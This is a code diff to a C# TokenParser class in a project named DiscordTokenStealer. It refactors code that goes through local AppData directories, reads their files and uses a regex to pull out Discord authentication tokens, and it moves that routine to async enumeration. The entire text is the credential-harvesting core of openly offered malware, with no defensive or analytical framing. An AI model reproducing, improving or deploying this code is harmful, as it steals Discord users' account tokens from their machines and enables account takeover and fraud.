@@ -6,43 +6,29 @@ namespace DiscordTokenStealer;
 
 public static class TokenParser
 {
-    private static readonly Regex TokenRegex = new Regex("((?:mfa|nfa)[.](.*?))\"", RegexOptions.Compiled);
-    public static IEnumerable<string> Parse()
+    private static readonly Regex TokenRegex = new("((?:mfa|nfa)[.](.*?))\"", RegexOptions.Compiled);
+
+    public static async IAsyncEnumerable<string> ParseAsync()
     {
-        HashSet<string> tokens = new HashSet<string>();
-        foreach (FieldInfo field in typeof(AppDataSearchProvider).GetFields(BindingFlags.Static | BindingFlags.Public))
+        foreach (var field in typeof(AppDataSearchProvider).GetFields(BindingFlags.Static | BindingFlags.Public)
+                     .Where(f => f.DeclaringType!.IsAssignableTo(typeof(IDirectorySearchProvider))))
         {
-            if (field.DeclaringType != typeof(AppDataSearchProvider))
-            {
+            if ((IDirectorySearchProvider?) field.GetValue(null) is not {Exists: true} searchProvider)
                 continue;
-            }
-            AppDataSearchProvider? provider = (AppDataSearchProvider?)field.GetValue(null);
-            if (provider is not { Exists: true })
+
+            await foreach (var contents in searchProvider.EnumerateContentsAsync())
             {
-                continue;
+                foreach (var token in ParseTokensFromString(contents))
+                    yield return token;
             }
-            tokens.UnionWith(ParseFrom(provider));
         }
-        return tokens;
     }
 
-    private static IEnumerable<string> ParseFrom(IDirectorySearchProvider searchProvider)
-    {
-        return Directory.EnumerateFiles(searchProvider.Directory, searchProvider.Pattern).AsParallel().SelectMany(fileName =>
-        {
-            try
-            {
-                return ParseTokens(File.ReadAllText(fileName));
-            }
-            catch
-            {
-                return Enumerable.Empty<string>();
-            }
-        });
-    }
 
-    private static IEnumerable<string> ParseTokens(string str)
+    private static IEnumerable<string> ParseTokensFromString(string str)
     {
-        return TokenRegex.Matches(str).Where(m => m.Success).Select(match => match.Groups[1].Value);
+        return from match in TokenRegex.Matches(str)
+            where match.Success && match.Groups.Count >= 1
+            select match.Groups[1].Value;
     }
 }
